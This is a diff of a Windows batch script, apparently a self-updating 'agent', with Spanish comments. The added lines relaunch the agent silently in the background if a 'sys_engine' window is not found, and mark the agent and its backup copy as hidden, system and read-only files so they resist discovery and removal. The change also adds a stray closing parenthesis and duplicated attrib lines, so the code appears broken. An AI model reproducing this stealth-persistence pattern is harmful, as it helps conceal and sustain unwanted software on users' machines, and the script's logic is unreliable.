@@ -49,6 +49,11 @@ if exist "%VERSION_LOCAL%" (
     set "LINEA_LOCAL=0"
 ) 
 if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
+    tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
+    if %errorlevel% neq 0 (
+    start /b "" cmd /c "%AGENTE_FILE%"
+    )
+    ::--- 4. RESTAURACIÓN Y EJECUCIÓN ---
     del "%VLINEA%" >nul 2>&1
     exit
 ) else (
@@ -67,6 +72,10 @@ if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
     copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
             
     rem 2.3 RE-ACTIVACIÓN DE ESCUDOS
+    attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
+    attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
+        
+)
     attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
     attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
         
